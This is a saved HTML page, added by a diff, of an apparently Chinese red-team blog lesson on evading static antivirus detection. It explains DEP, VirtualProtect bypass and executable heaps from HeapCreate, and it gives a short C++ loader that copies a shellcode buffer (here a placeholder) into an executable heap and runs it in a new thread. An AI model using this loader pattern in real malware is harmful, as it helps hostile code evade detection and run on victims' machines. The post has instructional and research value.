@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>静态恶意代码逃逸（第九课） « 倾旋的博客</title>
+  <meta name="description" content="代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode0x01 数据执行保护（DEP）DEP(Data Execution Prevention)即“ 数据执行保护”，这是Windows的一项安全机制，主要用来防止病毒和其他安全威胁对系统造成破坏。 ...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2020-11-29/2">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">静态恶意代码逃逸（第九课）</h1>
+    <p class="post-meta">Nov 29, 2020</p>
+  </header>
+
+  <article class="post-content">
+    <p>代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode</p>
+
+<h2 id="0x01-数据执行保护dep">0x01 数据执行保护（DEP）</h2>
+
+<p>DEP(Data Execution Prevention)即“ 数据执行保护”，这是Windows的一项安全机制，主要用来防止病毒和其他安全威胁对系统造成破坏。 微软从Windows XP SP2引入了该技术，并一直延续到今天。</p>
+
+<h3 id="为什么要有dep">为什么要有DEP</h3>
+
+<p>在Windows Xp SP2 之前的时代，缓冲区溢出漏洞利用门槛太低了，只要发现有缓冲区溢出漏洞，就可以直接稳定利用，攻击者只需要将Shellcode不断写入堆栈，然后覆盖函数返回地址，代码就可以在堆栈中执行。但堆栈的用途主要是保存寄存器现场，提供一个函数运行时的存储空间，极少数需要代码在堆栈中执行，于是微软为了缓解类似的情况，发明了DEP保护机制，用于限制某些内存页不具有可执行权限。</p>
+
+<h2 id="0x02-如何绕过dep">0x02 如何绕过DEP</h2>
+
+<p><code class="language-plaintext highlighter-rouge">VirtualProtect</code>这个API能够更改内存页的属性为可执行或不可执行，对于二进制漏洞利用来说，溢出的时候，把返回地址设计为<code class="language-plaintext highlighter-rouge">VirtualProtect</code>的地址，再精心构造一个栈为调用这个API的栈，就可以改变当前栈的内存页的属性，使其从”不可执行”变成”可执行”。</p>
+
+<h2 id="0x03-举一反三">0x03 举一反三</h2>
+
+<p>由此说来，Shellcode执行其实也需要一个可执行的内存页，那么还有哪些API能够构造一个可执行的内存页呢？</p>
+
+<p><code class="language-plaintext highlighter-rouge">HeapCreate</code>可以在进程中创建辅助堆栈，并且能够设置堆栈的属性：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">WINAPI</span> <span class="nf">HeapCreate</span><span class="p">(</span>
+<span class="n">__in</span> <span class="n">DWORD</span> <span class="n">flOptions</span><span class="p">,</span>
+<span class="n">__in</span> <span class="n">SIZE_T</span> <span class="n">dwInitialSize</span><span class="p">,</span>
+<span class="n">__in</span> <span class="n">SIZE_T</span> <span class="n">dwMaximumSize</span> <span class="p">);</span>
+</code></pre></div></div>
+
+<p>第一个参数<code class="language-plaintext highlighter-rouge">flOptions</code>用于修改如何在堆栈上执行各种操作。
+你可以设定<code class="language-plaintext highlighter-rouge">0</code>、<code class="language-plaintext highlighter-rouge">HEAP_NO_SERIALIZE</code>、<code class="language-plaintext highlighter-rouge">HEAP_GENERATE_EXCEPTIONS</code>、<code class="language-plaintext highlighter-rouge">HEAP_CREATE_ENABLE_EXECUTE</code>或者是这些标志的组合。</p>
+
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">HEAP_NO_SERIALIZE</code>：对堆的访问是非独占的，如果一个线程没有完成对堆的操作，其它线程也可以进程堆操作，这个开关是非常危险的，应尽量避免使用。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">HEAP_GENERATE_EXCEPTIONS</code>：当堆分配内存失败时，会抛出异常。如果不设置，则返回NULL。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">HEAP_CREATE_ENALBE_EXECUTE</code>：堆中存放的内容是可以执行的代码。如果不设置，意味着堆中存放的是不可执行的数据。</li>
+</ul>
+
+<p>看到<code class="language-plaintext highlighter-rouge">HEAP_CREATE_ENALBE_EXECUTE</code>相信很多人能够恍然大悟，我们的Shellcode可以存入这个辅助堆栈中，然后创建一个线程运行它即可。</p>
+
+<h2 id="0x04-shellcode执行">0x04 Shellcode执行</h2>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"123"</span><span class="p">;</span>
+
+	<span class="n">HANDLE</span> <span class="n">hHep</span> <span class="o">=</span> <span class="n">HeapCreate</span><span class="p">(</span><span class="n">HEAP_CREATE_ENABLE_EXECUTE</span> <span class="o">|</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+	<span class="n">PVOID</span> <span class="n">Mptr</span> <span class="o">=</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hHep</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+
+	<span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">Mptr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+	<span class="n">DWORD</span> <span class="n">dwThreadId</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">Mptr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwThreadId</span><span class="p">);</span>
+	<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
+
+    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Hello World!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>上方的例子中，我将shellcode替换为了其他字符串，因为我觉得shellcode混淆是另外一回事。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/0e3f2579a680f84059c5c53f9d472895.png" alt="2020-11-29-17-41-52"></p>
+
+<blockquote>
+  <p>样本链接：https://www.virustotal.com/gui/file/1db88905be721e2b279f8f9a6dad1fbf945311b50cc79378d9f69cec5bbe2f6a/detection</p>
+</blockquote>
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
